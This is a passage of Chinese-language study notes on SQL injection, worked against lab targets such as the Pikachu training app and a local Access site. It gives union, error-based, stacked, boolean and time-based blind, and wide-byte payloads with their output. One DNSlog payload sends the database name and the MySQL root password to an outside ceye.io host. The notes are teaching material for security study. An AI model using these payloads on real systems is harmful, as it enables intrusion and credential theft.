<p>   交互原理：<br>   $name&#x3D;$_GET[‘name’];</p>
<p>   $query&#x3D;”select id,email from member where username&#x3D;’$name’”;<br>   name&#x3D;xiaoq<br>   select id,email from member where username&#x3D;’xiaoq’<br>   利用漏洞：<br>   xiaoq’ or 1&#x3D;1 #</p>
<h3 id="搜索类型"><a href="#搜索类型" class="headerlink" title="搜索类型"></a>搜索类型</h3><p>  模糊匹配查询数据，传输数据库信息是任意字符信息</p>
<p>  典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_search.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_search.php</a><br>  交互原理：<br>   $name&#x3D;$_GET[‘name’];</p>
<p>   $query&#x3D;”select username,id,email from member where username like ‘%$name%‘“;<br>   name&#x3D;xiaoq<br>   select username,id,email from member where username like ‘%xiaoq%‘</p>
<p>   利用漏洞： </p>
<p>   select username,id,email from member where username like ‘%xiaoq%‘ or 1&#x3D;1 #%‘</p>
<p>   xxx%‘ or 1&#x3D;1 #</p>
<h3 id="特殊类型"><a href="#特殊类型" class="headerlink" title="特殊类型"></a>特殊类型</h3><p> 精确匹配查询数据，传输数据库信息是任意字符信息，也称为XX型</p>
<p> 典型页面：<a href="http://192.168.88.128:90/pikachu/vul/sqli/sqli_x.php">http://192.168.88.128:90/pikachu/vul/sqli/sqli_x.php</a><br>   交互原理：<br>   $name&#x3D;$_GET[‘name’];</p>
<p>   $query&#x3D;”select id,email from member where username&#x3D;(‘$name’)”;<br>   name&#x3D;xiaoq<br>   select id,email from member where username&#x3D;(‘xiaoq’)<br>   利用漏洞：<br>   w’) or 1&#x3D;1 #</p>
<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h3><p>union操作符用于合并两个或多个SQL语句指令信息，得到联合的查询结果；</p>
<p>使用示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union select name,age from teac where name=&#x27;zhangwu&#x27;;</span><br><span class="line">+---------+------+</span><br><span class="line">| name    | age  |</span><br><span class="line">+---------+------+</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">+---------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#union all 不会进行重复值的过滤</span><br><span class="line">MySQL [xiaoq]&gt; select name,age from stu where name=&#x27;zhangwu&#x27; union all select name,age from teac where name=&#x27;zhangwu&#x27;;</span><br><span class="line">+---------+------+</span><br><span class="line">| name    | age  |</span><br><span class="line">+---------+------+</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">| zhangwu |   24 |</span><br><span class="line">+---------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p>
<p>注意：当主查询语句和子查询语句中的字段个数不一致时，将会报错<br>select name,age,render from stu where name&#x3D;’zhangwu’ union all select name,age from teac where name&#x3D;’zhangwu’;<br>错误提示：The used SELECT statements have a different number of columns</p>
<p>解决方法思路：需要判断主查询语句的字段个数，通过order by 排序实现</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a\%&#x27;  order by 3 #</span><br><span class="line">    用户名中含有a\%&#x27; order by 3 #的结果如下：</span><br><span class="line"></span><br><span class="line">    username：allen</span><br><span class="line">    uid:2</span><br><span class="line">    email is: allen@pikachu.com</span><br><span class="line"></span><br><span class="line">    username：grady</span><br><span class="line">    uid:4</span><br><span class="line">    email is: grady@pikachu.com</span><br><span class="line"></span><br><span class="line">a\%&#x27;  order by 4 #</span><br><span class="line">	报错：Unknown column &#x27;4&#x27; in &#x27;order clause&#x27;</span><br><span class="line">	</span><br><span class="line"><span class="meta prompt_">	</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">#说明 主查询语句中字段数量为3</span></span></span><br></pre></td></tr></table></figure>



<p>知道字段数之后通过占位进行注入</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a\%&#x27; union select username,email,version() from member #</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">    用户名中含有a\%&#x27; union select username,email,version() from member #的结果如下：</span><br><span class="line"></span><br><span class="line">    username：allen</span><br><span class="line">    uid:2</span><br><span class="line">    email is: allen@pikachu.com</span><br><span class="line">    username：grady</span><br><span class="line">    uid:4</span><br><span class="line">    email is: grady@pikachu.com</span><br><span class="line"></span><br><span class="line">    username：vince</span><br><span class="line">    uid:vince@pikachu.com</span><br><span class="line">    email is: 5.5.53</span><br><span class="line">	.................</span><br><span class="line"></span><br><span class="line">常用的函数：</span><br><span class="line">	USER();		VERSION();  	DATABASE();  </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="information-schema注入"><a href="#information-schema注入" class="headerlink" title="information_schema注入"></a>information_schema注入</h3><p>information_schema是MYSQL 5.0之后数据库中默认的数据库，此数据库中有数据库的元数据信息，包含了一些数据库统计信息（有哪些库、表、字段、数据存储量、应用索引数量）</p>
<p>典型页面：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p>
<p><strong>应用方式</strong></p>
<ol>
<li>获取数据库的库名<ol>
<li>vince’ union select database(),user(),3#%</li>
</ol>
</li>
<li>获取数据库的表名<ol>
<li>u’ union select table_schema,table_name,3 from information_schema.tables where table_schema&#x3D;’pikachu’#</li>
</ol>
</li>
<li>获取数据库表中的字段<ol>
<li>k’ union select table_name,column_name,3 from information_schema.columns where table_name&#x3D;’user’#%</li>
</ol>
</li>
<li>获取数据库的数据<ol>
<li>kobe’union select username ,password,3 from users#%</li>
</ol>
</li>
</ol>
<p>常规方法应用步骤</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="number">1</span>、获取所有数据库表明</span><br><span class="line"><span class="keyword">SELECT</span> SCHEMA_NAME <span class="keyword">FROM</span> information_schema.SCHEMATA;</span><br><span class="line"></span><br><span class="line">#<span class="number">2</span>、获取当前数据库的表名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES <span class="keyword">WHERE</span> TABLE_SCHEMA <span class="operator">=</span> DATABASE();</span><br><span class="line"></span><br><span class="line">#<span class="number">3</span>、获取指定表的列名</span><br><span class="line"><span class="keyword">SELECT</span> COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">#<span class="number">4</span>、获取所有数据库的表名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME <span class="keyword">FROM</span> information_schema.TABLES;</span><br><span class="line"></span><br><span class="line">#<span class="number">5</span>、获取所有数据库的列名</span><br><span class="line"><span class="keyword">SELECT</span> TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME <span class="keyword">FROM</span> information_schema.COLUMNS;</span><br><span class="line"></span><br><span class="line">#<span class="number">6</span>、获取表的数据</span><br><span class="line"><span class="keyword">SELECT</span> username, password <span class="keyword">FROM</span> users;</span><br></pre></td></tr></table></figure>



<h3 id="报错函数注入"><a href="#报错函数注入" class="headerlink" title="报错函数注入"></a>报错函数注入</h3><p>报错注入顾名思义主要是利用<strong>数据库报错</strong>来进行判断是否存在注入点，如果不符合数据库语法规则就会产生错误</p>
<p>常用函数：</p>
<p>​	updatexml（）	:函数是MYSQL对XML文档数据进行查询和修改的XPATH函数.</p>
<p>​	extractvalue（）     :函数也是MYSQL对XML文档数据进行查询的XPATH函数.<br>​	floor（）		   :MYSQL中用来取整的函数.</p>
<p>典型网站：<a href="http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php">http://192.168.138.130:90/pikachu/vul/sqli/sqli_search.php</a></p>
<p>updatexml实战测试：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#<span class="number">1</span>、爆数据库版本信息</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#2、爆数据库当前用户</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)#  </span><br><span class="line"></span><br><span class="line">#<span class="number">3</span>、爆数据库</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#4、爆表,但是反馈回的错误表示只能显示一行，所以采用limit来一行一行显示</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;pikachu&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>) #</span><br><span class="line"></span><br><span class="line">#<span class="number">5</span>、爆字段</span><br><span class="line">a\<span class="operator">%</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;limit 2,1)),0)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#6、爆字段内容</span></span><br><span class="line"><span class="string">a\%&#x27;</span> <span class="keyword">and</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> password <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">0</span>)#</span><br></pre></td></tr></table></figure>













<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>c</p>
<blockquote>
<p>与union区别：</p>
<p>堆叠注入方式和union联合注入方式类似，都是实现多个SQL语句命令拼接，同时执行操作，但是union联合注入只能实现多个select语句拼接，不能实现其他语句拼接，然而堆叠注入，还可以实现拼接其他SQL类型语句，实现操作数据库。</p>
</blockquote>
<p>PS：需要关注用户权限  </p>
<p>举例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>新建一个表</span><br><span class="line"> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">create table</span> test <span class="keyword">like</span> users;</span><br><span class="line"> </span><br><span class="line"><span class="number">2.</span>删除上面新建的test表</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">drop</span> <span class="keyword">table</span> test;</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>查询数据</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>





<h3 id="盲注方式"><a href="#盲注方式" class="headerlink" title="盲注方式"></a>盲注方式</h3><p>适用场景：应用程序就会返回一个“通用的”的页面，或者重定向一个通用页面（可能为网站首页）。</p>
<h4 id="基于布尔类型的SQL盲注"><a href="#基于布尔类型的SQL盲注" class="headerlink" title="基于布尔类型的SQL盲注"></a>基于布尔类型的SQL盲注</h4><ul>
<li>页面仅返回两种状态（如登录成功&#x2F;失败、数据存在&#x2F;不存在）</li>
<li>无法通过联合查询或报错注入直接获取数据</li>
</ul>
<p>select ascii(substr(database(),1,1))&gt;xx;<br>通过对比ascii码的长度，判断出数据库表名的第一个字符。</p>
<p>database() – 输出数据库名称信息  		  pikachu<br>1,1        – 取出数据库名称第一个字符		p<br>substr()   – 数据库名称字符调取出来  	     p<br>ascii	   – 将字符信息转成编码数值   	    112（是可以识别，也不会显示）</p>
<p>&gt;113 &lt;111 &#x3D;112  – 通过112编码反向处理 112 - p（确认）</p>
<p>vince’ and ascii(substr(database(),1,1))&#x3D;112#  – 推断出数据库名称第一个字母 p </p>
<p><strong>流程举例</strong></p>
<p>1、判断注入点以及闭合方式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>  <span class="comment">-- 正常响应（True）</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>  <span class="comment">-- 异常响应（False）</span></span><br></pre></td></tr></table></figure>



<p>2、获取数据库名</p>
<p>①判断数据库名长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+</span></span><br></pre></td></tr></table></figure>

<p>通过二分法逐步调整数值（如 &gt;10、&lt;5）最终确定长度。</p>
<p>②逐个字符猜解数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr(database(),1,1))=115 --+</span></span><br></pre></td></tr></table></figure>

<p>通过ASCII码逐个字符判断（substr(database(),n,1) 截取第n位字符）</p>
<p>3、获取表名</p>
<p>①判断表数量及表名长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 --+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">6</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>②逐字符猜解表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=109 --+</span></span><br></pre></td></tr></table></figure>



<p>4、获取字段名</p>
<p>①判断字符数量及字段长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;)=3 --+</span></span><br><span class="line"><span class="string">id=1&#x27;</span> <span class="keyword">and</span> length((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>②逐字符猜解字段名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 0,1),1,1))=105 --+</span></span><br></pre></td></tr></table></figure>



<p>5、提取数据内容</p>
<p>①判断数据长度</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length((select username from users limit 0,1))=5 --+</span></span><br></pre></td></tr></table></figure>

<p>②逐字符猜解数据</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and ascii(substr((select username from users limit 0,1),1,1))=97 --+</span></span><br></pre></td></tr></table></figure>











<h4 id="基于时间类型的SQL盲注"><a href="#基于时间类型的SQL盲注" class="headerlink" title="基于时间类型的SQL盲注"></a>基于时间类型的SQL盲注</h4><p>基于时间类型的SQL盲注（Time-Based Blind SQL Injection）是一种通过观察数据库响应时间差异来推断信息的注入技术，常用于无法直接获取数据回显的场景。</p>
<p>常用延时函数：</p>
<ul>
<li>MySQL：SLEEP(5)、BENCHMARK(10000000,MD5(‘test’)) </li>
<li>SQL Server：WAITFOR DELAY ‘0:0:5’ </li>
<li>PostgreSQL：PG_SLEEP(5)</li>
</ul>
<p>测试方法：</p>
<p><strong>一、判断注入点及注入类型</strong></p>
<ul>
<li>基础测试</li>
</ul>
<p>在参数后添加延时函数，观察页面响应时间是否显著增加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SLEEP(5)--</span><br></pre></td></tr></table></figure>

<p>如果页面响应延迟约5秒，则可能存在时间盲注漏洞。</p>
<ul>
<li><p>闭合方式测试</p>
<p>根据参数闭合方式调整Payload（如单引号、双引号等）：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; OR IF(1=1,SLEEP(5),0)--</span><br></pre></td></tr></table></figure>





<p><strong>二、获取数据库信息</strong> </p>
<p>1.获取数据库名 </p>
<p>判断数据库名长度  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(LENGTH(DATABASE())=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p> 逐步替换N，直到响应延迟，确定长度。 </p>
<p>​	逐字符猜解数据库名  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR(DATABASE(),1,1))=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p>替换N为ASCII码（如97对应字符a），逐个字符猜解。  </p>
<p>2.获取表名</p>
<p> 猜解表数量  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE())=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p> 逐表猜解表名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1),1,1))=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p>通过LIMIT遍历所有表，逐字符猜解表名。  </p>
<p>3.获取字段名 </p>
<p>猜解字段数量 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name=&#x27;users&#x27;)=N, SLEEP(5),0)-- </span><br></pre></td></tr></table></figure>

<p>逐字段猜解名称 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT columnname FROM informationschema.columns WHERE table_name=&#x27;users&#x27; LIMIT 0,1),1,1))=N, SLEEP(5),0)- </span><br></pre></td></tr></table></figure>



<p>4.提取数据 </p>
<p>猜解字段内容 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(ASCII(SUBSTR((SELECT username FROM users LIMIT 0,1),1,1))=N, SLEEP(5),0)-</span><br></pre></td></tr></table></figure>











<h4 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h4><p><a href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园</a></p>
<p>以sql盲注为例，后端数据库用的mysql数据库，说一下用dnslog回显只能用于windows系统，为什么呢。因为在利用sql盲注进行DNSlog回显时，需要用到load_file函数，这个函数可以进行DNS请求。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.zs69k2.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/oldboy/1884700-20210210181611688-1713394196.png" alt="img"></p>
<p>利用concat()函数将查询的数据库名和域名拼接，执行后查看DNSlog</p>
<p><img src="/img/oldboy/1884700-20210210181632406-1270734005.png" alt="img"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LOAD_FILE(CONCAT(<span class="string">&#x27;\\\\&#x27;</span>,(<span class="keyword">SELECT</span> password <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span> LIMIT <span class="number">1</span>),<span class="string">&#x27;.mysql.ip.port.b182oj.ceye.io\\abc&#x27;</span>));</span><br></pre></td></tr></table></figure>



<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>当php开启magic_quotes_gpc（魔术引号开关，可以将SQL注入语句中的单引号转换为字符信息）宽字节注入可以在开启魔术引号开启之后，还原引号的功能</p>
<p>magic_quotes_gpc：通过在引号’前面添加转义字符”\“使引号’失去含义</p>
<p><strong>思路：</strong></p>
<p>&#39; -&gt; url编码 -&gt; %5c%27 -&gt; %df%5c %27  -&gt; 縗’</p>
<p>%df 	&#x3D;&#x3D; ß<br>%df%5c	&#x3D;&#x3D; 縗</p>
<p>通过在%5c前面添加%df从而使%27逃匿出来，组成为<u>%df%5c%</u>27</p>
<p>注意：宽字节注入时，需要确定数据库的字符集为GBK编码</p>
<h2 id="实战应用"><a href="#实战应用" class="headerlink" title="实战应用"></a>实战应用</h2><h3 id="数据库类型确认方式"><a href="#数据库类型确认方式" class="headerlink" title="数据库类型确认方式"></a>数据库类型确认方式</h3><h4 id="使用内置变量爆数据库类型"><a href="#使用内置变量爆数据库类型" class="headerlink" title="使用内置变量爆数据库类型"></a>使用内置变量爆数据库类型</h4><p>“User”是SQL Server的一个内置变量，它的值是当前连接的用户名，其变量类型为“nvarchar”字符型。通过提交查询该变量，根据返回的出错信息即可得知数据库类型。</p>
<p>使用语句：</p>
<p>​	and user&gt;0</p>
<p>​	该查询语句会将user对应的nvarchar型值与int数字型的0进行对比，两个数据类型不一致，因此会返回出错信息。</p>
<p><strong>1、MsSQL报错信息：</strong></p>
<p>​	Microsoft OLE DB Provider for SQL Server 错误’80040e21’</p>
<p>​	将nvarchar值’****’转换为数据类型为int的列时发生语法错误。</p>
<p><strong>2、Access报错信息：</strong></p>
<p>​	Microsoft OLE DB Provider Drivers ODBC Drivers 错误 ‘80040e21’</p>
<p>​	ODBC 驱动程序不支持所需的属性。 </p>
<p><strong>3、Mysql报错信息：</strong></p>
<p>​	<strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>C:\phpstudy\WWW\mysql\sql.php</strong> on line 12</p>
<h4 id="内置数据表爆数据库类型"><a href="#内置数据表爆数据库类型" class="headerlink" title="内置数据表爆数据库类型"></a>内置数据表爆数据库类型</h4><p>如果服务器IIS不允许返回错误提示，通常可以通过数据库内置的系统数据表来进行判断。在注入点后提交如下查询语句。</p>
<p>and  (select count(*)  from sysobjects)&gt;0</p>
<p>and (select count(*)  from msysobjects)&gt;0</p>
<p><strong>1、MsSQL报错信息：</strong></p>
<p>​	在MS SQL Serve:存在系统表[sysobjects]，不存在[msysobjects]系统表</p>
<p>​	Microsoft OLE DB Provider for SQL Server 错误 ‘80040e37’</p>
<p>​	对象名 ‘msysobjects’ 无效。</p>
<p>​	&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8</p>
<p><strong>2、Access报错信息：</strong></p>
<p>​	Access存在系统表[msysobjects]，不存在“sysobjects”表。</p>
<p>​	Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e37’</p>
<p>​	&#x2F;home&#x2F;yz&#x2F;yu&#x2F;show.asp, 行 8</p>
<p>​	[Microsoft][ODBC Microsoft Access Driver] Microsoft Jet数据库引擎找不到输入表或查询’sysobjects’。确定它是否存在，以及它的名称的拼写是否正确。</p>
<p><strong>3、Mysql报错信息：</strong></p>
<p>​	<strong>Warning</strong>:  mysql_fetch_array() expects parameter 1 to be resource, boolean given in <strong>C:\phpstudy\WWW\mysql\sql.php</strong> on line 12</p>
<h3 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h3><h4 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h4><h5 id="爆出数据库类型"><a href="#爆出数据库类型" class="headerlink" title="爆出数据库类型"></a>爆出数据库类型</h5><p>典型网站：<a href="http://192.168.138.130:81/news_view.asp?id=14">http://192.168.138.130:81/news_view.asp?id=14</a></p>
<p>通过方法一：</p>
<p>​	<a href="http://192.168.138.130:81/news_view.asp?id=14%5C%20and%5C%20user%5C%3E0">http://192.168.138.130:81/news_view.asp?id=14\%20and\%20user\%3E0</a></p>
<p>​	Microsoft OLE DB Provider for ODBC Drivers 错误 ‘80040e21’</p>
<p>​	ODBC 驱动程序不支持所需的属性。</p>
<p>​	&#x2F;news_view.asp，行 20 </p>
<p>可以判断出改数据库类型为Access数据库</p>
<h5 id="猜解数据库表名"><a href="#猜解数据库表名" class="headerlink" title="猜解数据库表名"></a>猜解数据库表名</h5><p>​	可在注入点后提交如下语句进行查询。</p>
<p>​	and exists(select *  from 数据库表名 )</p>
<p>​	或者</p>
<p>​	and (select count(*) from 数据库表名 )&gt;&#x3D;0</p>
<p>​	上面的语句是判断数据库中是否存在指定数据库表名。如果页面返回出错，那么可更换其他常见数据库表名继续进行查询。</p>
<h5 id="猜解表字段名及长度"><a href="#猜解表字段名及长度" class="headerlink" title="猜解表字段名及长度"></a>猜解表字段名及长度</h5><p>​	可在注入点后提交如下语句查询。</p>
<p>​	and exists(select 字段名  from 数据库表名 )</p>
<p>​	或者</p>
<p>​	and (select count(字段名) from 数据库表名 )&gt;&#x3D;0</p>
<p>​	如果存在此字段名，返回页面正常，否则可更换字段名继续进行猜测。</p>
<p>​	猜解字段长度，可提交如下查询语句。</p>
<p>​	当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;1</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;2</p>
<p>​	…</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;n-1</p>
<p>​	and (select top 1 len(字段名) from 数据库表名 )&gt;n</p>
<p>​	当提交&gt;n-1时正常，而提交到&gt;n时返回出错，那么说明字段长度为n。</p>
<h5 id="猜解字段值"><a href="#猜解字段值" class="headerlink" title="猜解字段值"></a>猜解字段值</h5><p>​	猜字段的ascii值，可在注入点后提交如下查询语句。</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;0</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;1</p>
<p>​	…</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n-1</p>
<p>​	and (select top 1 asc(mid(字段名,1,1)) from 数据库表名 )&gt;n</p>
<p>​	当提交&gt;n-I时正常，而提交到&gt;n时返回出错，那么说明字段值的ASCII码为n。反查ASCII码对应的字符，就可得到字段值的第一位字符。再继续提交如下查询。</p>
<p>​	and (select top 1 asc(mid(字段名,2,1)) from 数据库表名 )&gt;0</p>
<p>​	用与上面相同的方法，可得到第二位字符。再继续进行查询，直接猜解出字段的所有字符值为止。</p>
<h4 id="Access注入实战案例"><a href="#Access注入实战案例" class="headerlink" title="Access注入实战案例"></a>Access注入实战案例</h4><p>案例地址：<a href="http://192.168.138.130:81/news_view.asp?id=14">http://192.168.138.130:81/news_view.asp?id=14</a></p>
<h5 id="猜解数据库表名和字段"><a href="#猜解数据库表名和字段" class="headerlink" title="猜解数据库表名和字段"></a>猜解数据库表名和字段</h5><p>首先来猜解数据库表名，提交如下网址。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from users)</p>
<p>返回错误信息，说明users表不存在，继续提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from admin)</p>
<p>还是返回错误信息，说明admin表不存在，继续提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select * from administrator)</p>
<p>注入错误页面响应：</p>
<p><img src="/img/oldboy/1-18.png"></p>
<p>注入正确页面响应：</p>
<p><img src="/img/oldboy/1-19.png"></p>
<p>继续猜测字段并提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select username from administrator)</p>
<p>返回错误信息，说明不存在username字段，继续提交。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and exists(select user_name from administrator)</p>
<p>返回正常页面，administrator表中存在字段user_name</p>
<p><img src="/img/oldboy/1-20.png"></p>
<h5 id="猜解字段长度"><a href="#猜解字段长度" class="headerlink" title="猜解字段长度"></a>猜解字段长度</h5><p>再继续猜测第一个字段内容长度。</p>
<p><a href="http://192.168.1.55:901/news_view.asp?id=14">http://192.168.1.55:901/news_view.asp?id=14</a> and (select top 1 len(user_name) from administrator)&gt;1&#x2F;&#x2F;正常</p>
